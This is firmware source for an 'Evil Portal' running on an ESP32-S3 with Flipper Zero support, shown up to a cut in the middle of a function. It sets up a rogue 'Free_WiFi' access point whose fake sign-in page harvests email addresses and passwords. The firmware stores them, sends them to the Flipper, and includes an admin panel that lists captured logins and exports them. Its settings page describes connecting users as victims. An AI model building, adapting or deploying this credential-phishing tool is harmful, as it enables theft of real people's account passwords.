// ============================================================================
// ESP32-S3 Evil Portal - Flipper Zero Edition v1.2.0
// ============================================================================
// 
// Full-featured captive portal with Flipper Zero integration.
// Combines standalone features with Flipper communication.
//
// FEATURES:
//   - Flipper Zero communication (receives HTML/AP, sends credentials)
//   - SPIFFS credential storage (persists across reboots)
//   - Web admin panel with authentication
//   - REST API for integration
//   - JSON/CSV export
//   - Dynamic configuration
//   - Samsung auto-popup support (IP 4.3.2.1)
//   - Works standalone OR with Flipper
//
// HARDWARE:
//   Board: ESP32-S3 (tested on Electronic Cats WiFi Dev Board)
//   
// FLIPPER CONNECTIONS:
//   ESP32 GPIO 43 (TX0) → Flipper Pin 14 (RX)
//   ESP32 GPIO 44 (RX0) → Flipper Pin 13 (TX)
//   ESP32 GND → Flipper GND
//
// ============================================================================

#include <Arduino.h>
#include <WiFi.h>
#include <AsyncTCP.h>
#include <ESPAsyncWebServer.h>
#include <DNSServer.h>
#include <SPIFFS.h>
#include <ArduinoJson.h>

// ============================================================================
// VERSION INFO
// ============================================================================

#define FIRMWARE_VERSION "1.2.0-flipper"
#define MAX_CREDENTIALS 100
#define MAX_HTML_SIZE 20000

// ============================================================================
// SERIAL CONFIGURATION
// ============================================================================

// Serial = USB (debug output)
// Serial0 = UART GPIO 43/44 (Flipper communication)
#define FlipperSerial Serial0
#define DebugSerial Serial
#define FLIPPER_BAUD 115200

// ============================================================================
// DEFAULT CONFIGURATION
// ============================================================================

#define DEFAULT_SSID "Free_WiFi"
#define DEFAULT_ADMIN_USER "admin"
#define DEFAULT_ADMIN_PASS "admin"

// IP Configuration - 4.3.2.1 enables Samsung auto-popup
IPAddress apIP(4, 3, 2, 1);
IPAddress netMsk(255, 255, 255, 0);

// LED Pins (Electronic Cats WiFi Dev Board - active LOW)
#define LED_ACCENT_PIN 4   // Blue
#define LED_STATUS_PIN 5   // Green  
#define LED_ALERT_PIN  6   // Red

// ============================================================================
// GLOBAL VARIABLES
// ============================================================================

AsyncWebServer server(80);
DNSServer dnsServer;

// Configuration (loaded from SPIFFS)
String portalSSID = DEFAULT_SSID;
String adminUser = DEFAULT_ADMIN_USER;
String adminPass = DEFAULT_ADMIN_PASS;

// Runtime stats
unsigned long bootTime = 0;
int totalCaptures = 0;
int nextCredentialId = 1;
bool spiffsAvailable = false;

// Flipper mode
bool flipperMode = false;
bool flipperPortalRunning = false;
char flipperApName[30] = "";
char flipperHtml[MAX_HTML_SIZE] = "";
bool hasFlipperHtml = false;
bool hasFlipperAp = false;

// HTML buffer for multi-line reception
String htmlBuffer = "";
bool receivingHtml = false;
int htmlLineCount = 0;

// ============================================================================
// HTML TEMPLATES
// ============================================================================

const char portal_html[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta charset="UTF-8">
    <title>WiFi Login</title>
    <style>
        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
        body { margin: 0; padding: 20px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        .container { background: white; padding: 40px 30px; border-radius: 20px; box-shadow: 0 20px 60px rgba(0,0,0,0.3); width: 100%; max-width: 400px; }
        h1 { margin: 0 0 10px 0; color: #333; font-size: 28px; text-align: center; }
        .subtitle { color: #666; text-align: center; margin: 0 0 30px 0; }
        .input-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 8px; color: #333; font-weight: 500; }
        input[type="email"], input[type="text"], input[type="password"] { width: 100%; padding: 15px; border: 2px solid #e1e1e1; border-radius: 10px; font-size: 16px; }
        input:focus { outline: none; border-color: #667eea; }
        button { width: 100%; padding: 15px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border: none; border-radius: 10px; font-size: 18px; font-weight: 600; cursor: pointer; }
        button:hover { transform: translateY(-2px); box-shadow: 0 5px 20px rgba(102, 126, 234, 0.4); }
        .footer { text-align: center; margin-top: 20px; color: #999; font-size: 12px; }
        .success { display: none; text-align: center; }
        .success.show { display: block; }
        .success h2 { color: #10b981; font-size: 48px; margin: 0; }
        .form-container.hide { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="form-container" id="formContainer">
            <h1>🌐 Free WiFi</h1>
            <p class="subtitle">Sign in to connect to the internet</p>
            <form id="loginForm">
                <div class="input-group">
                    <label>Email Address</label>
                    <input type="email" name="email" placeholder="your@email.com" required>
                </div>
                <div class="input-group">
                    <label>Password</label>
                    <input type="password" name="password" placeholder="Enter any password" required>
                </div>
                <button type="submit">Connect to WiFi</button>
            </form>
            <div class="footer">By connecting, you agree to our Terms of Service</div>
        </div>
        <div class="success" id="successMsg">
            <h2>✓</h2>
            <h3>Connected!</h3>
            <p>You now have internet access.</p>
        </div>
    </div>
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            var formData = new FormData(this);
            var params = new URLSearchParams(formData).toString();
            var img = new Image();
            img.src = '/get?' + params;
            document.getElementById('formContainer').classList.add('hide');
            document.getElementById('successMsg').classList.add('show');
        });
    </script>
</body>
</html>
)rawliteral";

const char admin_dashboard_html[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta charset="UTF-8">
    <title>Admin Dashboard</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #0f172a; min-height: 100vh; color: #e2e8f0; }
        .navbar { background: #1e293b; padding: 16px 24px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #334155; flex-wrap: wrap; gap: 12px; }
        .navbar h1 { font-size: 20px; }
        .navbar a { color: #94a3b8; text-decoration: none; margin-left: 20px; font-size: 14px; }
        .navbar a:hover { color: #e2e8f0; }
        .navbar a.active { color: #3b82f6; }
        .container { max-width: 1200px; margin: 0 auto; padding: 24px; }
        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px; }
        .stat-card { background: #1e293b; padding: 24px; border-radius: 12px; border: 1px solid #334155; }
        .stat-card h3 { font-size: 14px; color: #94a3b8; margin-bottom: 8px; }
        .stat-card .value { font-size: 32px; font-weight: 700; color: #3b82f6; }
        .stat-card .value.green { color: #10b981; }
        .stat-card .value.yellow { color: #f59e0b; }
        .stat-card .value.purple { color: #a855f7; }
        .card { background: #1e293b; border-radius: 12px; border: 1px solid #334155; margin-bottom: 20px; }
        .card-header { padding: 16px 24px; border-bottom: 1px solid #334155; display: flex; justify-content: space-between; align-items: center; }
        .card-header h2 { font-size: 18px; }
        .card-body { padding: 24px; }
        table { width: 100%; border-collapse: collapse; }
        th, td { padding: 12px 16px; text-align: left; border-bottom: 1px solid #334155; }
        th { color: #94a3b8; font-weight: 600; font-size: 12px; text-transform: uppercase; }
        td { font-size: 14px; }
        .btn { padding: 8px 16px; border-radius: 6px; border: none; font-size: 14px; cursor: pointer; text-decoration: none; display: inline-block; }
        .btn-primary { background: #3b82f6; color: white; }
        .btn-danger { background: #ef4444; color: white; }
        .btn-success { background: #10b981; color: white; }
        .btn:hover { opacity: 0.9; }
        .btn-sm { padding: 6px 12px; font-size: 12px; }
        .warning-box { background: #7f1d1d; border: 1px solid #991b1b; color: #fecaca; padding: 16px; border-radius: 8px; margin-bottom: 20px; }
        .info-box { background: #1e3a5f; border: 1px solid #3b82f6; color: #93c5fd; padding: 16px; border-radius: 8px; margin-bottom: 20px; }
        .actions { display: flex; gap: 10px; flex-wrap: wrap; }
        .empty-state { text-align: center; padding: 40px; color: #64748b; }
        .mode-badge { display: inline-block; padding: 4px 12px; border-radius: 20px; font-size: 12px; font-weight: 600; }
        .mode-flipper { background: #7c3aed; color: white; }
        .mode-standalone { background: #059669; color: white; }
        @media (max-width: 768px) { .navbar { flex-direction: column; padding: 12px 16px; } .navbar h1 { font-size: 18px; } .navbar nav { display: flex; flex-wrap: wrap; gap: 8px; justify-content: center; } .navbar a { margin-left: 0; padding: 6px 10px; background: #334155; border-radius: 6px; font-size: 12px; } .container { padding: 16px; } .stats-grid { grid-template-columns: 1fr 1fr; gap: 12px; } .stat-card { padding: 16px; } .stat-card .value { font-size: 20px; } }
    </style>
</head>
<body>
    <nav class="navbar">
        <h1>🎭 Evil Portal Admin <span class="mode-badge" id="modeBadge">--</span></h1>
        <nav>
            <a href="/admin" class="active">Dashboard</a>
            <a href="/admin/logs">Logs</a>
            <a href="/admin/config">Config</a>
            <a href="/admin/export">Export</a>
            <a href="/admin/logout">Logout</a>
        </nav>
    </nav>
    <div class="container">
        <div class="warning-box" id="defaultPassWarning" style="display:none;">⚠️ Using default credentials! Change them in <a href="/admin/config" style="color:#fecaca;">Config</a>.</div>
        <div class="info-box" id="flipperInfo" style="display:none;">📡 <strong>Flipper Mode Active</strong> - Portal controlled by Flipper Zero.</div>
        <div class="stats-grid">
            <div class="stat-card"><h3>Total Captures</h3><div class="value" id="totalCaptures">--</div></div>
            <div class="stat-card"><h3>Portal SSID</h3><div class="value green" id="ssid" style="font-size:18px;">--</div></div>
            <div class="stat-card"><h3>Uptime</h3><div class="value yellow" id="uptime" style="font-size:18px;">--</div></div>
            <div class="stat-card"><h3>Mode</h3><div class="value purple" id="modeDisplay" style="font-size:18px;">--</div></div>
        </div>
        <div class="card">
            <div class="card-header"><h2>Recent Captures</h2><a href="/admin/logs" class="btn btn-primary btn-sm">View All</a></div>
            <div class="card-body">
                <table><thead><tr><th>#</th><th>Time</th><th>Email</th><th>Password</th></tr></thead><tbody id="recentLogs"><tr><td colspan="4" class="empty-state">Loading...</td></tr></tbody></table>
            </div>
        </div>
        <div class="card">
            <div class="card-header"><h2>Quick Actions</h2></div>
            <div class="card-body">
                <div class="actions">
                    <a href="/admin/export?format=json" class="btn btn-success">Export JSON</a>
                    <a href="/admin/export?format=csv" class="btn btn-success">Export CSV</a>
                    <button onclick="clearLogs()" class="btn btn-danger">Clear All Logs</button>
                    <button onclick="rebootDevice()" class="btn btn-danger">Reboot Device</button>
                </div>
            </div>
        </div>
    </div>
    <script>
        function formatTime(ts) { if (!ts) return 'N/A'; return new Date(ts * 1000).toLocaleString(); }
        function formatUptime(s) { return Math.floor(s/3600)+'h '+Math.floor((s%3600)/60)+'m '+(s%60)+'s'; }
        function loadData() {
            fetch('/api/v1/dashboard', {credentials: 'include'}).then(r => { if (r.status === 401) { window.location.href = '/admin'; return null; } return r.json(); }).then(data => {
                if (!data) return;
                document.getElementById('totalCaptures').textContent = data.credentials_count;
                document.getElementById('ssid').textContent = data.ssid;
                document.getElementById('uptime').textContent = formatUptime(data.uptime);
                var modeDisplay = document.getElementById('modeDisplay');
                var modeBadge = document.getElementById('modeBadge');
                if (data.flipper_mode) { modeDisplay.textContent = 'Flipper'; modeBadge.textContent = 'Flipper'; modeBadge.className = 'mode-badge mode-flipper'; document.getElementById('flipperInfo').style.display = 'block'; }
                else { modeDisplay.textContent = 'Standalone'; modeBadge.textContent = 'Standalone'; modeBadge.className = 'mode-badge mode-standalone'; }
                if (data.default_creds) document.getElementById('defaultPassWarning').style.display = 'block';
                var tbody = document.getElementById('recentLogs');
                if (!data.recent_logs || data.recent_logs.length === 0) { tbody.innerHTML = '<tr><td colspan="4" class="empty-state">No credentials captured yet</td></tr>'; return; }
                tbody.innerHTML = data.recent_logs.map(log => '<tr><td>' + log.id + '</td><td>' + formatTime(log.timestamp) + '</td><td>' + log.email + '</td><td>' + log.password + '</td></tr>').join('');
            });
        }
        function clearLogs() { if (confirm('Delete ALL credentials?')) { fetch('/api/v1/logs', { method: 'DELETE', credentials: 'include' }).then(r => r.json()).then(data => { alert(data.message || 'Logs cleared'); loadData(); }); } }
        function rebootDevice() { if (confirm('Reboot the device?')) { fetch('/api/v1/reboot', { method: 'POST', credentials: 'include' }).then(() => alert('Rebooting...')); } }
        loadData(); setInterval(loadData, 30000);
    </script>
</body>
</html>
)rawliteral";

const char admin_logs_html[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta charset="UTF-8">
    <title>Captured Logs</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #0f172a; min-height: 100vh; color: #e2e8f0; }
        .navbar { background: #1e293b; padding: 16px 24px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #334155; flex-wrap: wrap; gap: 12px; }
        .navbar h1 { font-size: 20px; }
        .navbar a { color: #94a3b8; text-decoration: none; margin-left: 20px; font-size: 14px; }
        .navbar a:hover { color: #e2e8f0; }
        .navbar a.active { color: #3b82f6; }
        .container { max-width: 1400px; margin: 0 auto; padding: 24px; }
        .toolbar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; flex-wrap: wrap; gap: 10px; }
        .toolbar h2 { font-size: 24px; }
        .card { background: #1e293b; border-radius: 12px; border: 1px solid #334155; overflow-x: auto; }
        table { width: 100%; border-collapse: collapse; min-width: 600px; }
        th, td { padding: 14px 16px; text-align: left; border-bottom: 1px solid #334155; }
        th { color: #94a3b8; font-weight: 600; font-size: 12px; text-transform: uppercase; background: #0f172a; }
        td { font-size: 14px; }
        tr:hover { background: #334155; }
        .btn { padding: 8px 16px; border-radius: 6px; border: none; font-size: 14px; cursor: pointer; text-decoration: none; display: inline-block; }
        .btn-primary { background: #3b82f6; color: white; }
        .btn-danger { background: #ef4444; color: white; }
        .btn:hover { opacity: 0.9; }
        .btn-sm { padding: 6px 12px; font-size: 12px; }
        .empty-state { text-align: center; padding: 60px 20px; color: #64748b; }
        .actions { display: flex; gap: 10px; flex-wrap: wrap; }
        @media (max-width: 768px) { .navbar { flex-direction: column; padding: 12px 16px; } .navbar nav { display: flex; flex-wrap: wrap; gap: 8px; justify-content: center; } .navbar a { margin-left: 0; padding: 6px 10px; background: #334155; border-radius: 6px; font-size: 12px; } .container { padding: 12px; } .toolbar { flex-direction: column; align-items: stretch; } }
    </style>
</head>
<body>
    <nav class="navbar">
        <h1>🎭 Evil Portal Admin</h1>
        <nav><a href="/admin">Dashboard</a><a href="/admin/logs" class="active">Logs</a><a href="/admin/config">Config</a><a href="/admin/export">Export</a><a href="/admin/logout">Logout</a></nav>
    </nav>
    <div class="container">
        <div class="toolbar">
            <h2>Captured Credentials</h2>
            <div class="actions"><button onclick="loadLogs()" class="btn btn-primary btn-sm">Refresh</button><button onclick="clearAll()" class="btn btn-danger btn-sm">Clear All</button></div>
        </div>
        <div class="card">
            <table><thead><tr><th>#</th><th>Date/Time</th><th>Email/Username</th><th>Password</th><th>Client IP</th><th>Actions</th></tr></thead><tbody id="logsTable"><tr><td colspan="6" class="empty-state">Loading...</td></tr></tbody></table>
        </div>
    </div>
    <script>
        function formatTime(ts) { if (!ts) return 'N/A'; return new Date(ts * 1000).toLocaleString(); }
        function escapeHtml(text) { var div = document.createElement('div'); div.textContent = text; return div.innerHTML; }
        function loadLogs() {
            fetch('/api/v1/logs').then(r => r.json()).then(data => {
                var tbody = document.getElementById('logsTable');
                if (data.logs.length === 0) { tbody.innerHTML = '<tr><td colspan="6" class="empty-state">No credentials captured yet</td></tr>'; return; }
                tbody.innerHTML = data.logs.map(log => '<tr><td>' + log.id + '</td><td>' + formatTime(log.timestamp) + '</td><td>' + escapeHtml(log.email) + '</td><td>' + escapeHtml(log.password) + '</td><td>' + (log.client_ip || 'N/A') + '</td><td><button onclick="deleteLog(' + log.id + ')" class="btn btn-danger btn-sm">Delete</button></td></tr>').join('');
            });
        }
        function deleteLog(id) { if (confirm('Delete this entry?')) { fetch('/api/v1/logs/' + id, { method: 'DELETE' }).then(() => loadLogs()); } }
        function clearAll() { if (confirm('Delete ALL credentials?')) { fetch('/api/v1/logs', { method: 'DELETE' }).then(() => loadLogs()); } }
        loadLogs(); setInterval(loadLogs, 10000);
    </script>
</body>
</html>
)rawliteral";

const char admin_config_html[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta charset="UTF-8">
    <title>Configuration</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #0f172a; min-height: 100vh; color: #e2e8f0; }
        .navbar { background: #1e293b; padding: 16px 24px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #334155; flex-wrap: wrap; gap: 12px; }
        .navbar h1 { font-size: 20px; }
        .navbar a { color: #94a3b8; text-decoration: none; margin-left: 20px; font-size: 14px; }
        .navbar a:hover { color: #e2e8f0; }
        .navbar a.active { color: #3b82f6; }
        .container { max-width: 600px; margin: 0 auto; padding: 24px; }
        .card { background: #1e293b; border-radius: 12px; border: 1px solid #334155; margin-bottom: 20px; }
        .card-header { padding: 16px 24px; border-bottom: 1px solid #334155; }
        .card-header h2 { font-size: 18px; }
        .card-body { padding: 24px; }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 8px; font-size: 14px; color: #94a3b8; }
        input { width: 100%; padding: 12px 16px; border: 1px solid #334155; border-radius: 8px; background: #0f172a; color: #e2e8f0; font-size: 16px; }
        input:focus { outline: none; border-color: #3b82f6; }
        .help-text { font-size: 12px; color: #64748b; margin-top: 6px; }
        .btn { padding: 12px 24px; border-radius: 8px; border: none; font-size: 16px; cursor: pointer; }
        .btn-primary { background: #3b82f6; color: white; }
        .btn-danger { background: #ef4444; color: white; }
        .btn:hover { opacity: 0.9; }
        .btn-block { width: 100%; }
        .success-msg { background: #064e3b; border: 1px solid #10b981; color: #6ee7b7; padding: 12px; border-radius: 8px; margin-bottom: 20px; display: none; }
        .success-msg.show { display: block; }
        .info-box { background: #1e3a5f; border: 1px solid #3b82f6; color: #93c5fd; padding: 12px; border-radius: 8px; margin-bottom: 20px; font-size: 14px; }
        @media (max-width: 768px) { .navbar { flex-direction: column; padding: 12px 16px; } .navbar nav { display: flex; flex-wrap: wrap; gap: 8px; justify-content: center; } .navbar a { margin-left: 0; padding: 6px 10px; background: #334155; border-radius: 6px; font-size: 12px; } .container { padding: 16px; } }
    </style>
</head>
<body>
    <nav class="navbar">
        <h1>🎭 Evil Portal Admin</h1>
        <nav><a href="/admin">Dashboard</a><a href="/admin/logs">Logs</a><a href="/admin/config" class="active">Config</a><a href="/admin/export">Export</a><a href="/admin/logout">Logout</a></nav>
    </nav>
    <div class="container">
        <div class="success-msg" id="successMsg">Configuration saved successfully!</div>
        <div class="info-box" id="flipperNote" style="display:none;">📡 <strong>Flipper Mode:</strong> SSID controlled by Flipper. Changes apply after restart in standalone mode.</div>
        <div class="card">
            <div class="card-header"><h2>Portal Settings</h2></div>
            <div class="card-body">
                <form id="portalForm">
                    <div class="form-group"><label>WiFi Network Name (SSID)</label><input type="text" name="ssid" id="ssid" maxlength="32" required><p class="help-text">Network name victims will see. Max 32 characters.</p></div>
                    <button type="submit" class="btn btn-primary btn-block">Save Portal Settings</button>
                </form>
            </div>
        </div>
        <div class="card">
            <div class="card-header"><h2>Admin Credentials</h2></div>
            <div class="card-body">
                <form id="adminForm">
                    <div class="form-group"><label>Admin Username</label><input type="text" name="admin_user" id="admin_user" required></div>
                    <div class="form-group"><label>Admin Password</label><input type="password" name="admin_pass" id="admin_pass" required></div>
                    <button type="submit" class="btn btn-primary btn-block">Update Credentials</button>
                </form>
            </div>
        </div>
        <div class="card">
            <div class="card-header"><h2>Device Control</h2></div>
            <div class="card-body"><button onclick="rebootDevice()" class="btn btn-danger btn-block">Reboot Device</button></div>
        </div>
    </div>
    <script>
        function loadConfig() { fetch('/api/v1/config').then(r => r.json()).then(data => { document.getElementById('ssid').value = data.ssid; document.getElementById('admin_user').value = data.admin_user; if (data.flipper_mode) document.getElementById('flipperNote').style.display = 'block'; }); }
        function showSuccess() { var msg = document.getElementById('successMsg'); msg.classList.add('show'); setTimeout(() => msg.classList.remove('show'), 3000); }
        document.getElementById('portalForm').addEventListener('submit', function(e) { e.preventDefault(); fetch('/api/v1/config', { method: 'POST', credentials: 'include', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ ssid: document.getElementById('ssid').value }) }).then(r => r.json()).then(data => { showSuccess(); if (data.restart_required) { alert('SSID changed. Device will restart.'); setTimeout(() => fetch('/api/v1/reboot', { method: 'POST' }), 1000); } }); });
        document.getElementById('adminForm').addEventListener('submit', function(e) { e.preventDefault(); fetch('/api/v1/config', { method: 'POST', credentials: 'include', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ admin_user: document.getElementById('admin_user').value, admin_pass: document.getElementById('admin_pass').value }) }).then(r => r.json()).then(data => { if (data.success) { showSuccess(); alert('Credentials updated! Please login again.'); window.location.href = '/admin/logout'; } }); });
        function rebootDevice() { if (confirm('Reboot device?')) { fetch('/api/v1/reboot', { method: 'POST' }).then(() => alert('Rebooting...')); } }
        loadConfig();
    </script>
</body>
</html>
)rawliteral";

const char admin_export_html[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta charset="UTF-8">
    <title>Export Data</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #0f172a; min-height: 100vh; color: #e2e8f0; }
        .navbar { background: #1e293b; padding: 16px 24px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #334155; flex-wrap: wrap; gap: 12px; }
        .navbar h1 { font-size: 20px; }
        .navbar a { color: #94a3b8; text-decoration: none; margin-left: 20px; font-size: 14px; }
        .navbar a:hover { color: #e2e8f0; }
        .navbar a.active { color: #3b82f6; }
        .container { max-width: 600px; margin: 0 auto; padding: 24px; }
        .card { background: #1e293b; border-radius: 12px; border: 1px solid #334155; }
        .card-header { padding: 16px 24px; border-bottom: 1px solid #334155; }
        .card-header h2 { font-size: 18px; }
        .card-body { padding: 24px; }
        .stats { text-align: center; padding: 20px; background: #0f172a; border-radius: 8px; margin-bottom: 20px; }
        .stats .number { font-size: 48px; font-weight: 700; color: #3b82f6; }
        .stats .label { color: #64748b; font-size: 14px; }
        .export-option { display: flex; justify-content: space-between; align-items: center; padding: 16px; background: #0f172a; border-radius: 8px; margin-bottom: 12px; }
        .export-info h3 { font-size: 16px; margin-bottom: 4px; }
        .export-info p { font-size: 12px; color: #64748b; }
        .btn { padding: 10px 20px; border-radius: 8px; border: none; font-size: 14px; cursor: pointer; text-decoration: none; }
        .btn-success { background: #10b981; color: white; }
        @media (max-width: 768px) { .navbar { flex-direction: column; padding: 12px 16px; } .navbar nav { display: flex; flex-wrap: wrap; gap: 8px; justify-content: center; } .navbar a { margin-left: 0; padding: 6px 10px; background: #334155; border-radius: 6px; font-size: 12px; } .export-option { flex-direction: column; gap: 12px; text-align: center; } .btn { width: 100%; } }
    </style>
</head>
<body>
    <nav class="navbar">
        <h1>🎭 Evil Portal Admin</h1>
        <nav><a href="/admin">Dashboard</a><a href="/admin/logs">Logs</a><a href="/admin/config">Config</a><a href="/admin/export" class="active">Export</a><a href="/admin/logout">Logout</a></nav>
    </nav>
    <div class="container">
        <div class="card">
            <div class="card-header"><h2>Export Captured Data</h2></div>
            <div class="card-body">
                <div class="stats"><div class="number" id="totalCount">--</div><div class="label">credentials available</div></div>
                <div class="export-option"><div class="export-info"><h3>📄 JSON Format</h3><p>Structured data for applications</p></div><a href="/api/v1/export/json" class="btn btn-success" download>Download</a></div>
                <div class="export-option"><div class="export-info"><h3>📊 CSV Format</h3><p>For Excel/Google Sheets</p></div><a href="/api/v1/export/csv" class="btn btn-success" download>Download</a></div>
            </div>
        </div>
    </div>
    <script>fetch('/api/v1/status').then(r => r.json()).then(data => { document.getElementById('totalCount').textContent = data.credentials_count; });</script>
</body>
</html>
)rawliteral";

// ============================================================================
// LED FUNCTIONS
// ============================================================================

void setupLED() {
    if (LED_ACCENT_PIN >= 0) pinMode(LED_ACCENT_PIN, OUTPUT);
    if (LED_STATUS_PIN >= 0) pinMode(LED_STATUS_PIN, OUTPUT);
    if (LED_ALERT_PIN >= 0) pinMode(LED_ALERT_PIN, OUTPUT);
}

void setLED(bool accent, bool status, bool alert) {
    if (LED_ACCENT_PIN >= 0) digitalWrite(LED_ACCENT_PIN, accent ? LOW : HIGH);
    if (LED_STATUS_PIN >= 0) digitalWrite(LED_STATUS_PIN, status ? LOW : HIGH);
    if (LED_ALERT_PIN >= 0) digitalWrite(LED_ALERT_PIN, alert ? LOW : HIGH);
}

void ledStarting() { setLED(true, false, false); }
void ledReady()    { setLED(false, true, false); }
void ledCapture()  { setLED(false, false, true); }

void blinkAlert(int times) {
    for (int i = 0; i < times; i++) {
        ledCapture();
        delay(200);
        ledReady();
        delay(200);
    }
}

// ============================================================================
// FLIPPER COMMUNICATION
// ============================================================================

void sendToFlipper(const char* message) {
    FlipperSerial.println(message);
    FlipperSerial.flush();
    delay(10);
    DebugSerial.print("[→FLIP] ");
    DebugSerial.println(message);
}

void sendCredentialsToFlipper(String email, String pass) {
    FlipperSerial.print("u: ");
    FlipperSerial.println(email);
    FlipperSerial.flush();
    delay(5);
    FlipperSerial.print("p: ");
    FlipperSerial.println(pass);
    FlipperSerial.flush();
    delay(5);
    DebugSerial.println("[→FLIP] Credentials sent to Flipper");
}

// ============================================================================
// SPIFFS FUNCTIONS
// ============================================================================

bool initSPIFFS() {
    DebugSerial.println("[*] Initializing SPIFFS...");
    
    if (SPIFFS.begin(false)) {
        DebugSerial.println("[+] SPIFFS mounted successfully");
        spiffsAvailable = true;
    } else {
        DebugSerial.println("[*] SPIFFS not mounted, attempting format...");
        if (SPIFFS.format()) {
            if (SPIFFS.begin(false)) {
                DebugSerial.println("[+] SPIFFS mounted after format");
                spiffsAvailable = true;
            }
        }
    }
    
    if (!spiffsAvailable) {
        DebugSerial.println("[!] SPIFFS unavailable - credentials will NOT persist!");
        return false;
    }
    
    DebugSerial.printf("[+] SPIFFS Total: %u bytes\n", SPIFFS.totalBytes());
    DebugSerial.printf("[+] SPIFFS Used: %u bytes\n", SPIFFS.usedBytes());
    
    if (!SPIFFS.exists("/config.json")) {
        DebugSerial.println("[*] Creating default config...");
        saveConfig();
    }
    
    if (!SPIFFS.exists("/logs.json")) {
        File f = SPIFFS.open("/logs.json", "w");
        if (f) { f.println("{\"logs\":[]}"); f.close(); }
    }
    
    loadConfig();
    loadCredentialCount();
    return true;
}

void loadConfig() {
    if (!spiffsAvailable) return;
    File f = SPIFFS.open("/config.json", "r");
    if (!f) return;
    JsonDocument doc;
    if (deserializeJson(doc, f)) { f.close(); return; }
    f.close();
    if (doc["ssid"].is<const char*>()) portalSSID = doc["ssid"].as<String>();
    if (doc["admin_user"].is<const char*>()) adminUser = doc["admin_user"].as<String>();
    if (doc["admin_pass"].is<const char*>()) adminPass = doc["admin_pass"].as<String>();
    if (doc["next_id"].is<int>()) nextCredentialId = doc["next_id"];
    DebugSerial.println("[+] Config loaded");
}

void saveConfig() {
    if (!spiffsAvailable) return;
    JsonDocument doc;
    doc["ssid"] = portalSSID;
    doc["admin_user"] = adminUser;
    doc["admin_pass"] = adminPass;
    doc["next_id"] = nextCredentialId;
    doc["version"] = FIRMWARE_VERSION;
    File f = SPIFFS.open("/config.json", "w");
    if (f) { serializeJson(doc, f); f.close(); DebugSerial.println("[+] Config saved"); }
}

void loadCredentialCount() {
    if (!spiffsAvailable) return;
    File f = SPIFFS.open("/logs.json", "r");
    if (!f) return;
    JsonDocument doc;
    deserializeJson(doc, f);
    f.close();
    if (doc["logs"].is<JsonArray>()) totalCaptures = doc["logs"].as<JsonArray>().size();
}

// ============================================================================
// CREDENTIAL STORAGE
// ============================================================================

void saveCredential(String email, String password, String clientIP, bool fromFlipper) {
    if (flipperMode || fromFlipper) sendCredentialsToFlipper(email, password);
    if (!spiffsAvailable) { totalCaptures++; return; }
    
    File f = SPIFFS.open("/logs.json", "r");
    JsonDocument doc;
    if (f) { deserializeJson(doc, f); f.close(); }
    
    JsonArray logs = doc["logs"].to<JsonArray>();
    while (logs.size() >= MAX_CREDENTIALS) {
        for (size_t i = 0; i < logs.size() - 1; i++) logs[i] = logs[i + 1];
        logs.remove(logs.size() - 1);
    }
    
    JsonObject newLog = logs.add<JsonObject>();
    newLog["id"] = nextCredentialId++;
    newLog["timestamp"] = millis() / 1000 + bootTime;
    newLog["email"] = email;
    newLog["password"] = password;
    newLog["ssid"] = flipperMode ? String(flipperApName) : portalSSID;
    newLog["client_ip"] = clientIP;
    newLog["source"] = flipperMode ? "flipper" : "standalone";
    
    f = SPIFFS.open("/logs.json", "w");
    if (f) { serializeJson(doc, f); f.close(); }
    totalCaptures = logs.size();
    saveConfig();
}

String getLogsJson(int limit = -1) {
    if (!spiffsAvailable) return "{\"count\":0,\"logs\":[]}";
    File f = SPIFFS.open("/logs.json", "r");
    if (!f) return "{\"count\":0,\"logs\":[]}";
    JsonDocument doc;
    deserializeJson(doc, f);
    f.close();
    JsonArray logs = doc["logs"].as<JsonArray>();
    JsonDocument response;
    response["count"] = logs.size();
    JsonArray responseLogs = response["logs"].to<JsonArray>();
    int start = (limit > 0 && logs.size() > (size_t)limit) ? logs.size() - limit : 0;
    for (size_t i = start; i < logs.size(); i++) responseLogs.add(logs[i]);
    String result;
    serializeJson(response, result);
    return result;
}

bool deleteCredential(int id) {
    if (!spiffsAvailable) return false;
    File f = SPIFFS.open("/logs.json", "r");
    if (!f) return false;
    JsonDocument doc;
    deserializeJson(doc, f);
    f.close();
